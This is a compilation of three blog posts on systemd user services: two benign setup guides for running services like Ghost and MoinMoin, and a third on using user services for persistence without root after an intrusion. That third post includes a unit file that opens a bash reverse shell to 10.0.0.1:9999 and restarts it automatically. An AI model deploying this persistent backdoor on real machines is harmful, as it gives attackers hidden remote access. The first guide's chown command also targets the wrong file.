# [`systemd` user services are amazing ](https://www.brendanlong.com/systemd-user-services-are-amazing.html) 



In the last few days, I've needed to set up several long-running services  and I just wanted to take a minute to talk about how helpful systemd's  user services have been.

The things I wanted to run are:

- A Node.js server which is started with `npm run`
- A Node.js client (for testing)
- [MoinMoin](https://moinmo.in/) (a wiki written in Python)
- [Ghost](https://ghost.org/) (blog software for Node.js)
- [SyncThing](https://syncthing.net/) (file sync like DropBox)

For the first one, I figured systemd would be useful, and I figured I might as well try running in user mode. The server isn't particularly stable, so systemd's automatic-restarting is helpful, and the sandboxing is  also nice to have.

Once I had the config file, I realized that  it's trivial to adapt it to any other long-running process. I also found another advantage: Since these run in user-mode, it's trivial to create a user for each service, do whatever I need to in their home directory, and then lock things down. I can log in as those users and run updates, and the only thing I need root access for is to give them permission to run services when not logged in ("lingering").

### [Users](https://www.brendanlong.com/systemd-user-services-are-amazing.html#users)

Creating single-use users is easy:

```
sudo adduser moin
```

To be able to ssh in as that user using the same keys as the current user:

```
sudo -u moin mkdir ~moin/.ssh
sudo cp ~/.ssh/authorized_keys ~moin/.ssh/authorized_keys
sudo chown moin:moin ~/.ssh/authorized_keys
```

If multiple people need access, you might want to generate the `authorized_keys` file from their public keys rather than just copying your own.

### [Unit files](https://www.brendanlong.com/systemd-user-services-are-amazing.html#unit-files)

Here's what my Ghost config looks like (in `~/.config/systemd/user/ghost.service`):

```
[Unit]
AssertPathExists=/home/ghost/ghost

[Service]
WorkingDirectory=/home/ghost/ghost
Environment=GHOST_NODE_VERSION_CHECK=false
ExecStart=/usr/bin/npm start --production
Restart=always
PrivateTmp=true
NoNewPrivileges=true

[Install]
WantedBy=default.target
```

The nice bits are that if it crashes, it will restart, it has its own `/tmp`, and even if it was hacked, it can't gain root priviledges (although, I'm not sure if these options work right in user mode).

With barely any changes, it works for MoinMoin too:

```
[Unit]
AssertPathExists=/home/moin/moin

[Service]
WorkingDirectory=/home/moin/moin
ExecStart=/usr/bin/python2 /home/moin/moin/wikiserver.py
Restart=always
PrivateTmp=true
NoNewPrivileges=true

[Install]
WantedBy=default.target
```

For my custom Node.js server, I could even have systemd provide the socket and then lock things down even more.

### [Auto-start and lingering](https://www.brendanlong.com/systemd-user-services-are-amazing.html#auto-start-and-lingering)

As root, give the user permission to run services when they're not logged in:

```
sudo loginctl enable-linger moin
```

Now log in as the user who will run this server. You must use a real login, like connecting over SSH. `sudo -s -u` won't give you the right environment.

```
ssh moin@yourserver.com
systemctl --user enable moin
```

[The end](https://www.brendanlong.com/systemd-user-services-are-amazing.html#the-end)

I just want to share how easy it was to do this, since separating  services to each be run by a different user is good for security, and  apparently it's super easy these days. 



## [Creating a Simple `Systemd` User Service](https://blog.victormendonca.com/2018/05/14/creating-a-simple-systemd-user-service/)

Quick instructions on how to create a simple `systemd` user service for a program or script.

1. Identify the script or program/binary that you will be using.
2. Create a `systemd` unit file using the example below, give it a name that will make sense to you with a `.service` extension (like `[my_service].service`), and save it to `$USER/.config/systemd/user`

```
[Unit]
Description=[Service description]

[Service]
Type=simple
StandardOutput=journal
ExecStart=[script path]

[Install]
WantedBy=default.target
```

For this example we used a service type simple, which allows `systemd`  to take care of the most basic needs for us. The options used are:

- `Description` = Description of your service. This will be shown when handling your service with `systemctl`
- `Type` = We will be using the simple type, and this could be left out
- `StandardOutput` = We will be logging it to the system log (you can use `journalctl` to view it)
- `ExectStart` = The script or program to be executed
- `WantedBy` = Service will be run using the default target. You can find what the `default.target` is with `systemctl get-default`

3. Enable your service so it starts automatically

```
systemctl --user enable [my_service].service
```

4. Start the service

```
systemctl --user start [my_service].service
```

5. Check that it’s running

```
systemctl --user status [my_service].service
```

## [Systemd user level persistence](https://medium.com/@alexeypetrenko/systemd-user-level-persistence-25eb562d2ea8)

There are multiple ways to keep persistence on a Linux system after getting  initial foothold. If you have root access, there is literally infinite  number of ways to do so: you can **backdoor** any part of a system. However, sometimes you do not have root access and you do not really need it,  but it is always nice to keep an access to the system after it reboots.

Here I will show one way of achieving persistence on most modern Linux  systems without having root access. For some reason this method does not seem to be getting enough attention.

It is stupidly simple: **use `systemd` user service.**

### Example

1. Place a service file in `~/.config/systemd/user/`.

   Here is a `rs.service` file used for a demo:

```
[Unit]
Description=Just a reverse shell[Service]
ExecStart=/usr/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/9999 0>&1'
Restart=always
RestartSec=60[Install]
WantedBy=default.target
```

2. Enable the service with `systemctl --user enable rs.service`

That is it. On the next user login systemd will happily start a reverse shell.

You can start it right away with `systemctl --user start rs.service` if you don’t want to wait for a next time system reboots.

The nice thing is that you can use most systemd features here. In the example above, I used `Restart` to restart a shell automatically on a failure. You may want to use  systemd timers to run your payload periodically and not have a process  constantly running if that is what you want.

### Limitations

By default, `systemd --user` is only started when a user logs in and a session is started. So, this  persistence method is mostly suited for desktops or kiosks and would be  useless for servers with no active user sessions.

It is possible to change this behavior and start `systemd --user` on boot rather than on user login. To do so, a root must run `loginctl enable-linger `. Obviously, we have no root access and cannot change these settings. But it is worth checking if it has already been enabled. In order to do so, look in `/var/lib/systemd/linger` directory. If lingering is enabled for a user `username`, there should be an empty file with a name `username`. (Per [this](https://serverfault.com/a/849280) amazing answer)

